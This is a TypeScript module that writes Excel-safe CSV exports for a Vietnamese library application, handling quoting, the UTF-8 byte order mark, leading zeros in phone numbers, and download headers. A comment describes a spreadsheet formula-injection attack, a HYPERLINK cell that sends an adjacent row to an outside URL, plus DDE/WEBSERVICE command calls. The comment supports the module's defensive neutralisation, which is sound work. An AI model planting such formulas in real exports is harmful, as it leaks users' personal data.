/**
 * CSV, for a volunteer opening it in Excel on Windows.
 *
 * P1 §3.3 names the audience and it is the whole specification: "The person
 * opening this file is a volunteer with Excel, not an engineer with a text
 * editor — the export exists as *insurance*, and insurance that reads as
 * garbage is not insurance." Three of the four rules below exist because that
 * person's spreadsheet does something to the bytes that a parser would not.
 *
 * **The quoting rule is RFC 4180's, applied to every field that needs it and no
 * others.** A field is wrapped in `"` when it contains a comma, a `"`, a
 * carriage return or a line feed; an embedded `"` is doubled. Fields are joined
 * with `,` and rows with `\r\n` — CRLF because RFC 4180 says so and because it
 * is what Excel writes itself, so a file round-tripped through it is unchanged.
 * A trailing CRLF closes the last row, which is what every spreadsheet emits and
 * what stops a final field from looking truncated.
 *
 * Not "quote everything". A quoted numeric column imports as text in some
 * spreadsheets, and this file is meant to be *worked on* after it is opened,
 * not only read.
 */

/**
 * The UTF-8 byte order mark, `EF BB BF`.
 *
 * **Without it, `Đặng Thị Kim Chi` opens as `Ä�áº·ng Thá»‹ Kim Chi`.** Excel
 * on Windows, opening a `.csv` by double-click, does not sniff the encoding: it
 * decodes with the system ANSI code page (Windows-1252 in most of the world,
 * 1258 in a Vietnamese install, neither of them UTF-8) unless the file opens
 * with this mark. The Import Text wizard lets you say otherwise; double-click
 * does not, and double-click is what happens.
 *
 * Every letter that carries a Vietnamese diacritic is multi-byte in UTF-8, so
 * this is not an edge case in the data — it is every name and nearly every
 * title in the file. LibreOffice and Numbers do sniff and are unharmed by the
 * mark; nothing loses.
 *
 * It is a **byte** fact, so `tests/lib/csv.test.ts` asserts the three bytes
 * rather than the string: `"﻿"` is one JavaScript character and a test
 * comparing strings would pass against a file written in UTF-16.
 */
export const UTF8_BOM = "﻿";

/**
 * The four characters that make Excel and LibreOffice treat a cell as a
 * formula rather than as text.
 *
 * `=SUM(1+1)` is the harmless demonstration. The one that matters is
 * `=HYPERLINK("http://…"&A2,"Bấm vào đây")` or a `DDE`/`WEBSERVICE` call: a
 * cell that exfiltrates the row beside it, or runs a command, when a volunteer
 * opens a file that came out of their own library system. Book titles, reader
 * names, donor names and audit reasons are all free text somebody typed into a
 * form, so every one of them is a cell an attacker — or a bored teenager with
 * an account — can begin with one of these.
 *
 * `-` and `+` are on the list for a duller reason too, and it is the one that
 * will actually happen here: a manager writing a note as "- sách bị ướt" gets
 * `#NAME?` in the cell instead of their sentence, because Excel read the dash
 * as a minus sign.
 */
const FORMULA_LEADERS = ["=", "+", "-", "@"];

/**
 * Neutralise a cell Excel would otherwise reinterpret.
 *
 * **A leading apostrophe, and it is visible.** Excel's CSV import does not
 * consume it the way it consumes one typed into a cell, so the volunteer sees
 * `'- sách bị ướt`. Every neutralisation alters the cell — the alternatives are
 * a leading tab (invisible, and silently breaks an exact-match lookup or a
 * copy-paste into another system) or a zero-width character (invisible and
 * worse). Visible and reversible beats invisible and wrong, which is the same
 * choice the BOM makes: better a mark you can see than bytes you cannot read.
 *
 * **The second rule is not about formulas and is here for the same audience.**
 * A cell that is nothing but digits and begins with `0` — which in this
 * application means every Vietnamese telephone number — is imported by Excel as
 * the *number* 912345678, and the leading zero is gone from the file's contents,
 * not merely from its display. Re-formatting the column afterwards does not
 * bring it back. A readers export whose phone numbers are each missing their
 * first digit is worse than mojibake, because mojibake announces itself.
 *
 * This second rule is a decision the P1 plan does not settle: §3.3 names the
 * BOM and formula injection and nothing else. It is here because the argument
 * for it is §3.3's own argument, word for word — the file is insurance and a
 * phone number that has quietly lost a digit is not insurance — and because
 * removing it is one line if a reviewer disagrees.
 */
function neutralise(cell: string): string {
  if (cell === "") return cell;
  if (FORMULA_LEADERS.includes(cell[0])) return `'${cell}`;
  if (/^0\d+$/.test(cell)) return `'${cell}`;
  return cell;
}

/** RFC 4180: quote when the field contains a delimiter, a quote or a newline. */
function quote(cell: string): string {
  if (/[",\r\n]/.test(cell)) return `"${cell.replaceAll('"', '""')}"`;
  return cell;
}

/**
 * A header row and its rows, as one CSV document.
 *
 * The headers go through `neutralise` too. They are Vietnamese words this
 * project wrote, so no header can currently begin with `-` — but a header is a
 * cell, the rule is about cells, and an exemption granted because "these ones
 * are safe" is the exemption that outlives the reason for it.
 */
export function toCsv(headers: string[], rows: string[][]): string {
  const line = (cells: string[]) =>
    cells.map((c) => quote(neutralise(c))).join(",");
  return (
    UTF8_BOM + [line(headers), ...rows.map(line)].map((l) => `${l}\r\n`).join("")
  );
}

/**
 * The same document as the bytes that go on the wire.
 *
 * The route handler uses this rather than handing a `string` to `Response`,
 * because the BOM is only a BOM once it is UTF-8: `new Response(string)`
 * happens to encode as UTF-8 today, and "happens to" is not what a file's
 * readability should rest on when the failure mode is silent mojibake on
 * somebody else's machine.
 */
export function toCsvBytes(headers: string[], rows: string[][]): Uint8Array {
  return new TextEncoder().encode(toCsv(headers, rows));
}

/**
 * The `Content-Type` for a CSV whose bytes are UTF-8.
 *
 * `charset=utf-8` is stated even though the BOM already says so: the two
 * disagree in different places. The header is what a browser saving the file
 * uses and what a `fetch` in a future integration would read; the BOM is what
 * Excel reads when the header is long gone because the file is sitting in a
 * Downloads folder. Belt and braces, and neither is redundant with the other.
 */
export const CSV_CONTENT_TYPE = "text/csv; charset=utf-8";

/**
 * A `Content-Disposition` that names the file, in ASCII and again in UTF-8.
 *
 * The bare `filename=` is deliberately ASCII-only: the header is a byte string,
 * a raw `Tủ sách` in it is either mangled or rejected outright depending on the
 * server, and `Response` in Node throws on a non-ISO-8859-1 header value. RFC
 * 6266's `filename*=UTF-8''…` carries the real name for every browser released
 * this decade, and the plain one is what the rest fall back to.
 */
export function attachmentHeader(asciiName: string, fullName: string): string {
  return `attachment; filename="${asciiName}"; filename*=UTF-8''${encodeURIComponent(fullName)}`;
}
